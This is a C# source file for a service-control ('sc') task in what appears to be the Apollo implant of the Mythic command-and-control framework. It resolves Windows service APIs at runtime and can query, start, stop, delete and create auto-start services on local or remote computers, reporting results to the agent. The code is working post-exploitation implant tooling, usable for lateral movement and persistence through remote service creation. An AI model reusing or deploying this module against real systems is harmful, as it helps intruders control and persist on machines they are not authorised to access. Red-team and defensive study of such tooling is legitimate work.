#define COMMAND_NAME_UPPER

#if DEBUG
#define SC
#endif

#if SC

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Permissions;
using System.Text;
using ST = System.Threading.Tasks;
using System.ServiceProcess;
using System.Threading;

namespace Tasks
{
    public class sc : Tasking
    {
        [DataContract]
        internal struct ScParameters
        {
            [DataMember(Name = "query")]
            public bool Query;
            [DataMember(Name = "start")]
            public bool Start;
            [DataMember(Name = "stop")]
            public bool Stop;
            [DataMember(Name = "create")]
            public bool Create;
            [DataMember(Name = "delete")]
            public bool Delete;
            [DataMember(Name = "computer")]
            public string Computer;
            [DataMember(Name = "service")]
            public string Service;
            [DataMember(Name = "display_name")]
            public string DisplayName;
            [DataMember(Name = "binpath")]
            public string Binpath;
        }

        [DataContract]
        internal struct ServiceResult
        {
            [DataMember(Name = "display_name")]
            public string DisplayName;
            [DataMember(Name = "service")]
            public string Service;
            [DataMember(Name = "status")]
            public string Status;
            [DataMember(Name = "can_stop")]
            public bool CanStop;

            [DataMember(Name = "computer")] public string Computer;
        }

        #region typedefs
        #region enums
        [Flags]
        public enum AccessMask : uint
        {
            DELETE = 0x00010000,

            READ_CONTROL = 0x00020000,

            WRITE_DAC = 0x00040000,

            WRITE_OWNER = 0x00080000,

            SYNCHRONIZE = 0x00100000,

            STANDARD_RIGHTS_REQUIRED = 0x000F0000,

            STANDARD_RIGHTS_READ = 0x00020000,

            STANDARD_RIGHTS_WRITE = 0x00020000,

            STANDARD_RIGHTS_EXECUTE = 0x00020000,

            STANDARD_RIGHTS_ALL = 0x001F0000,

            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

            ACCESS_SYSTEM_SECURITY = 0x01000000,

            MAXIMUM_ALLOWED = 0x02000000,

            GENERIC_READ = 0x80000000,

            GENERIC_WRITE = 0x40000000,

            GENERIC_EXECUTE = 0x20000000,

            GENERIC_ALL = 0x10000000,

            DESKTOP_READOBJECTS = 0x00000001,

            DESKTOP_CREATEWINDOW = 0x00000002,

            DESKTOP_CREATEMENU = 0x00000004,

            DESKTOP_HOOKCONTROL = 0x00000008,

            DESKTOP_JOURNALRECORD = 0x00000010,

            DESKTOP_JOURNALPLAYBACK = 0x00000020,

            DESKTOP_ENUMERATE = 0x00000040,

            DESKTOP_WRITEOBJECTS = 0x00000080,

            DESKTOP_SWITCHDESKTOP = 0x00000100,

            WINSTA_ENUMDESKTOPS = 0x00000001,

            WINSTA_READATTRIBUTES = 0x00000002,

            WINSTA_ACCESSCLIPBOARD = 0x00000004,

            WINSTA_CREATEDESKTOP = 0x00000008,

            WINSTA_WRITEATTRIBUTES = 0x00000010,

            WINSTA_ACCESSGLOBALATOMS = 0x00000020,

            WINSTA_EXITWINDOWS = 0x00000040,

            WINSTA_ENUMERATE = 0x00000100,

            WINSTA_READSCREEN = 0x00000200,

            WINSTA_ALL_ACCESS = 0x0000037F
        }

        [Flags]
        public enum SCMAccess : uint
        {
            /// <summary>
            /// Required to connect to the service control manager.
            /// </summary>
            SC_MANAGER_CONNECT = 0x00001,

            /// <summary>
            /// Required to call the CreateService function to create a service
            /// object and add it to the database.
            /// </summary>
            SC_MANAGER_CREATE_SERVICE = 0x00002,

            /// <summary>
            /// Required to call the EnumServicesStatusEx function to list the 
            /// services that are in the database.
            /// </summary>
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,

            /// <summary>
            /// Required to call the LockServiceDatabase function to acquire a 
            /// lock on the database.
            /// </summary>
            SC_MANAGER_LOCK = 0x00008,

            /// <summary>
            /// Required to call the QueryServiceLockStatus function to retrieve 
            /// the lock status information for the database.
            /// </summary>
            SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,

            /// <summary>
            /// Required to call the NotifyBootConfigStatus function.
            /// </summary>
            SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,

            /// <summary>
            /// Includes STANDARD_RIGHTS_REQUIRED, in addition to all access 
            /// rights in this table.
            /// </summary>
            SC_MANAGER_ALL_ACCESS =
                AccessMask.STANDARD_RIGHTS_REQUIRED | SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_LOCK | SC_MANAGER_QUERY_LOCK_STATUS
                | SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_READ = AccessMask.STANDARD_RIGHTS_READ | SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_QUERY_LOCK_STATUS,

            GENERIC_WRITE = AccessMask.STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_EXECUTE = AccessMask.STANDARD_RIGHTS_EXECUTE | SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

            GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
        }

        [Flags]
        public enum ServiceControl : uint
        {
            STOP = 0x00000001,

            PAUSE = 0x00000002,

            CONTINUE = 0x00000003,

            INTERROGATE = 0x00000004,

            SHUTDOWN = 0x00000005,

            PARAMCHANGE = 0x00000006,

            NETBINDADD = 0x00000007,

            NETBINDREMOVE = 0x00000008,

            NETBINDENABLE = 0x00000009,

            NETBINDDISABLE = 0x0000000A,

            DEVICEEVENT = 0x0000000B,

            HARDWAREPROFILECHANGE = 0x0000000C,

            POWEREVENT = 0x0000000D,

            SESSIONCHANGE = 0x0000000E
        }

        [Flags]
        public enum ServiceAccess : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,

            SERVICE_QUERY_CONFIG = 0x00001,

            SERVICE_CHANGE_CONFIG = 0x00002,

            SERVICE_QUERY_STATUS = 0x00004,

            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,

            SERVICE_START = 0x00010,

            SERVICE_STOP = 0x00020,

            SERVICE_PAUSE_CONTINUE = 0x00040,

            SERVICE_INTERROGATE = 0x00080,

            SERVICE_USER_DEFINED_CONTROL = 0x00100,

            SERVICE_ALL_ACCESS =
                (STANDARD_RIGHTS_REQUIRED | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_START | SERVICE_STOP | SERVICE_PAUSE_CONTINUE
                 | SERVICE_INTERROGATE | SERVICE_USER_DEFINED_CONTROL)
        }

        [Flags]
        public enum ServiceType : int
        {
            SERVICE_KERNEL_DRIVER = 0x00000001,

            SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,

            SERVICE_WIN32_OWN_PROCESS = 0x00000010,

            SERVICE_WIN32_SHARE_PROCESS = 0x00000020,

            SERVICE_INTERACTIVE_PROCESS = 0x00000100
        }

        public enum ServiceErrorControl : int
        {
            /// <summary>
            /// The startup program logs the error in the event log, if possible. If the last-known-good configuration is being started, the startup operation fails. Otherwise, the system is restarted with the last-known good configuration.
            /// </summary>
            SERVICE_ERROR_CRITICAL = 0x00000003,

            /// <summary>
            /// The startup program ignores the error and continues the startup operation.
            /// </summary>
            SERVICE_ERROR_IGNORE = 0x00000000,

            /// <summary>
            /// The startup program logs the error in the event log but continues the startup operation.
            /// </summary>
            SERVICE_ERROR_NORMAL = 0x00000001,

            /// <summary>
            /// The startup program logs the error in the event log. If the last-known-good configuration is being started, the startup operation continues. Otherwise, the system is restarted with the last-known-good configuration.
            /// </summary>
            SERVICE_ERROR_SEVERE = 0x00000002,
        }

        public enum ServiceStartType : int
        {
            /// <summary>
            /// A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services.
            /// </summary>
            SERVICE_AUTO_START = 0x00000002,

            /// <summary>
            /// A device driver started by the system loader. This value is valid only for driver services.
            /// </summary>
            SERVICE_BOOT_START = 0x00000000,

            /// <summary>
            /// A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand.
            /// </summary>
            SERVICE_DEMAND_START = 0x00000003,

            /// <summary>
            /// A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED.
            /// </summary>
            SERVICE_DISABLED = 0x00000004,

            /// <summary>
            /// A device driver started by the IoInitSystem function. This value is valid only for driver services.
            /// </summary>
            SERVICE_SYSTEM_START = 0x00000001

        }

        public enum SERVICE_STATE : uint
        {
            SERVICE_STOPPED = 0x00000001,

            SERVICE_START_PENDING = 0x00000002,

            SERVICE_STOP_PENDING = 0x00000003,

            SERVICE_RUNNING = 0x00000004,

            SERVICE_CONTINUE_PENDING = 0x00000005,

            SERVICE_PAUSE_PENDING = 0x00000006,

            SERVICE_PAUSED = 0x00000007
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct ServiceStatus
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(ServiceStatus));

            public ServiceType dwServiceType;

            public SERVICE_STATE dwCurrentState;

            public uint dwControlsAccepted;

            public uint dwWin32ExitCode;

            public uint dwServiceSpecificExitCode;

            public uint dwCheckPoint;

            public uint dwWaitHint;
        }
        #endregion
        private delegate bool CloseServiceHandle(IntPtr hService);
        private static CloseServiceHandle _pCloseServiceHandle = null;

        private delegate ServiceControlHandle OpenSCManager(string lpMachineName, string lpSCDB, SCMAccess scParameter);
        private static OpenSCManager _pOpenSCManager = null;

        private delegate ServiceControlHandle CreateService(
            ServiceControlHandle serviceControlManagerHandle,
            string lpSvcName,
            string lpDisplayName,
            ServiceAccess dwDesiredAccess,
            ServiceType dwServiceType,
            ServiceStartType dwStartType,
            ServiceErrorControl dwErrorControl,
            string lpPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);
        private static CreateService _pCreateService = null;

        private delegate bool ControlService(IntPtr hService, ServiceControl dwControl, ref ServiceStatus lpServiceStatus);
        private static ControlService _pControlService = null;

        private delegate int StartService(ServiceControlHandle serviceHandle, int dwNumServiceArgs, string lpServiceArgVectors);
        private static StartService _pStartService = null;

        private delegate ServiceControlHandle OpenService(ServiceControlHandle hServiceManager, string lpSvcName, ServiceAccess dwDesiredAccess);
        private static OpenService _pOpenService = null;

        private delegate int DeleteService(ServiceControlHandle hServiceControl);
        private static DeleteService _pDeleteService = null;
        #endregion

        [SecurityPermission(SecurityAction.InheritanceDemand, UnmanagedCode = true)]
        [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
        public class ServiceControlHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            // Create a SafeHandle, informing the base class 
            // that this SafeHandle instance "owns" the handle,
            // and therefore SafeHandle should call 
            // our ReleaseHandle method when the SafeHandle 
            // is no longer in use.
            private ServiceControlHandle()
                : base(true)
            {
            }

            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
            override protected bool ReleaseHandle()
            {
                // Here, we must obey all rules for constrained execution regions. 
                return _pCloseServiceHandle(this.handle);
                // If ReleaseHandle failed, it can be reported via the 
                // "releaseHandleFailed" managed debugging assistant (MDA).  This
                // MDA is disabled by default, but can be enabled in a debugger 
                // or during testing to diagnose handle corruption problems. 
                // We do not throw an exception because most code could not recover 
                // from the problem.
            }
        }

        private static bool InstallService(string hostname, string ServiceName, string ServiceDisplayName, string ServiceEXE)
        {
            try
            {
                UninstallService(hostname, ServiceName);
            }
            catch (Exception ex) { }
            Console.WriteLine("[*] Attempting to create service {0} on {1}...", ServiceName, hostname);
            using (var scmHandle = _pOpenSCManager(hostname, null, SCMAccess.SC_MANAGER_CREATE_SERVICE))
            {
                if (scmHandle.IsInvalid)
                {
                    throw new Exception("Failed to open SCM.");
                }

                using (
                    var serviceHandle = _pCreateService(
                        scmHandle,
                        ServiceName,
                        ServiceDisplayName,
                        ServiceAccess.SERVICE_ALL_ACCESS,
                        ServiceType.SERVICE_WIN32_OWN_PROCESS,
                        ServiceStartType.SERVICE_AUTO_START,
                        ServiceErrorControl.SERVICE_ERROR_NORMAL,
                        ServiceEXE,
                        null,
                        IntPtr.Zero,
                        null,
                        null,
                        null))
                {
                    if (serviceHandle.IsInvalid)
                    {
                        throw new Exception("Received InvalidHandle from CreateService");
                    }
                    return true;
                }
            }
        }
        private static bool UninstallService(string hostname, string ServiceName)
        {
            using (var scmHandle = _pOpenSCManager(hostname, null, SCMAccess.SC_MANAGER_CREATE_SERVICE))
            {
                if (scmHandle.IsInvalid)
                {
                    throw new Exception($"Failed to open SCM.");
                }
                else
                {
                    using (var serviceHandle = _pOpenService(scmHandle, ServiceName, ServiceAccess.SERVICE_ALL_ACCESS))
                    {
                        if (serviceHandle.IsInvalid)
                        {
                            throw new Exception($"ServiceHandle is invalid.");
                        }
                        else
                        {
                            _pDeleteService(serviceHandle);
                            return true;
                        }
                    }
                }
            }
        }

        public sc(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            if (_pDeleteService == null)
            {
                _pDeleteService = _agent.GetApi().GetLibraryFunction<DeleteService>(Library.ADVAPI32, "DeleteService");
            }
            if (_pOpenService == null)
            {
                _pOpenService = _agent.GetApi().GetLibraryFunction<OpenService>(Library.ADVAPI32, "OpenServiceA");
            }
            if (_pStartService == null)
            {
                _pStartService = _agent.GetApi().GetLibraryFunction<StartService>(Library.ADVAPI32, "StartServiceA");
            }
            if (_pCloseServiceHandle == null)
            {
                _pCloseServiceHandle = _agent.GetApi().GetLibraryFunction<CloseServiceHandle>(Library.ADVAPI32, "CloseServiceHandle");
            }
            if (_pOpenSCManager == null)
            {
                _pOpenSCManager = _agent.GetApi().GetLibraryFunction<OpenSCManager>(Library.ADVAPI32, "OpenSCManagerA");
            }
            if (_pCreateService == null)
            {
                _pCreateService = _agent.GetApi().GetLibraryFunction<CreateService>(Library.ADVAPI32, "CreateServiceA");
            }
            if (_pControlService == null)
            {
                _pControlService = _agent.GetApi().GetLibraryFunction<ControlService>(Library.ADVAPI32, "ControlService");
            }
        }

        public override void Kill()
        {
            base.Kill();
        }

        private void ValidateParameters(ScParameters args)
        {
            if (args.Start)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Start action requires service name to start.");
                }
            } else if (args.Stop)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Stop action requires service name to stop.");
                }
            } else if (args.Query)
            {
                
            } else if (args.Create)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Create action requires service name to create.");
                } else if (string.IsNullOrEmpty(args.Binpath))
                {
                    throw new Exception("Create action requires binpath to new service binary.");
                }
            } else if (args.Delete)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Delete action requires service name to delete.");
                }
            }
            else
            {
                throw new Exception("No valid action given for sc.");
            }
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                ScParameters parameters = _jsonSerializer.Deserialize<ScParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.Computer))
                {
                    parameters.Computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
                }
                ValidateParameters(parameters);
                string errorMessage = "";
                List<ServiceResult> results = new List<ServiceResult>();
                if (parameters.Query)
                {
                    try
                    {
                        ServiceController[] services = ServiceController.GetServices(parameters.Computer);
                        if (services.Length > 0)
                        {
                            string filterString = "";
                            if (!string.IsNullOrEmpty(parameters.Service))
                            {
                                filterString = parameters.Service;
                            } else if (!string.IsNullOrEmpty(parameters.DisplayName))
                            {
                                filterString = parameters.DisplayName;
                            }
                            foreach(ServiceController svc in services)
                            {
                                if (string.IsNullOrEmpty(filterString))
                                {
                                    results.Add(new ServiceResult
                                    {
                                        DisplayName = svc.DisplayName,
                                        Service = svc.ServiceName,
                                        CanStop = svc.CanStop,
                                        Status = svc.Status.ToString(),
                                        Computer =  parameters.Computer
                                    });
                                } else if (svc.DisplayName == filterString || svc.ServiceName == filterString)
                                {
                                    results.Add(new ServiceResult
                                    {
                                        DisplayName = svc.DisplayName,
                                        Service = svc.ServiceName,
                                        CanStop = svc.CanStop,
                                        Status = svc.Status.ToString(),
                                        Computer =  parameters.Computer
                                    });
                                    break;
                                }
                            }
                        }
                        resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse($"Failed to enumerate services on {parameters.Computer}. Reason: {ex.Message}", true, "error");
                    }
                } else if (parameters.Create)
                {
                    try
                    {
                        if (InstallService(parameters.Computer, parameters.Service, parameters.DisplayName, parameters.Binpath))
                        {
                            ServiceController createdService = new ServiceController(parameters.Service, parameters.Computer);
                            results.Add(new ServiceResult
                            {
                                DisplayName = createdService.DisplayName,
                                Service = createdService.ServiceName,
                                Status = createdService.Status.ToString(),
                                CanStop = createdService.CanStop,
                                Computer =  parameters.Computer
                            });
                            resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                        } else
                        {
                            resp = CreateTaskResponse("Failed to create service.", true, "error");
                        }
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse($"Failed to create service. Reason: {ex.Message}", true, "error");
                    }
                } else if (parameters.Delete)
                {
                    try
                    {
                        if (UninstallService(parameters.Computer, parameters.Service))
                        {
                            resp = CreateTaskResponse($"Deleted service {parameters.Service} from {parameters.Computer}", true);
                        } else
                        {
                            resp = CreateTaskResponse("Failed to delete service.", true, "error");
                        }
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse(
                            $"Failed to delete service. Reason: {ex.Message}", true, "error");
                    }
                } else if (parameters.Start)
                {
                    try
                    {
                        ServiceController instance = new ServiceController(parameters.Service, parameters.Computer);
                        if (instance.Status == ServiceControllerStatus.Running || instance.Status == ServiceControllerStatus.StartPending)
                        {
                            resp = CreateTaskResponse(
                                $"Service {instance.ServiceName} on {parameters.Computer} is already started, and is in state: {instance.Status}",
                                true,
                                "error");
                        } else
                        {
                            instance.Start();
                            ST.Task waitForServiceAsync = new ST.Task(() =>
                            {
                                instance.WaitForStatus(ServiceControllerStatus.Running);
                            }, _cancellationToken.Token);
                            waitForServiceAsync.Start();
                            ST.Task.WaitAny(new ST.Task[] { waitForServiceAsync }, _cancellationToken.Token);
                            _cancellationToken.Token.ThrowIfCancellationRequested();
                            results.Add(new ServiceResult
                            {
                                DisplayName = instance.DisplayName,
                                Service = instance.ServiceName,
                                CanStop = instance.CanStop,
                                Status = instance.Status.ToString(),
                                Computer =  parameters.Computer
                            });
                            resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                        }
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse($"Failed to start service. Reason: {ex.Message}", true, "error");
                    }
                } else if (parameters.Stop)
                {
                    try
                    {
                        ServiceController stopInstance = new ServiceController(parameters.Service, parameters.Computer);
                        if (stopInstance.Status == ServiceControllerStatus.Stopped || stopInstance.Status == ServiceControllerStatus.StopPending)
                        {
                            resp = CreateTaskResponse($"Service {stopInstance.ServiceName} on {parameters.Computer} is already stopped, and is in state: {stopInstance.Status}",
                                true, "error");
                        } else
                        {
                            stopInstance.Stop();
                            ST.Task stopTask = new ST.Task(() =>
                            {
                                stopInstance.WaitForStatus(ServiceControllerStatus.Stopped);
                            });
                            stopTask.Start();
                            ST.Task.WaitAny(new ST.Task[]
                            {
                                stopTask
                            }, _cancellationToken.Token);
                            _cancellationToken.Token.ThrowIfCancellationRequested();
                            results.Add(new ServiceResult
                            {
                                DisplayName = stopInstance.DisplayName,
                                Service = stopInstance.ServiceName,
                                CanStop = stopInstance.CanStop,
                                Status = stopInstance.Status.ToString(),
                                Computer =  parameters.Computer
                            });
                            resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                        }
                    } catch (Exception ex)
                    {
                        resp = CreateTaskResponse($"Failed to stop service. Reason: {ex.Message}", true, "error");
                    }
                }
                else
                {
                    resp = CreateTaskResponse($"No valid action given.", true, "error");
                }
                
                // Your code here..
                // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif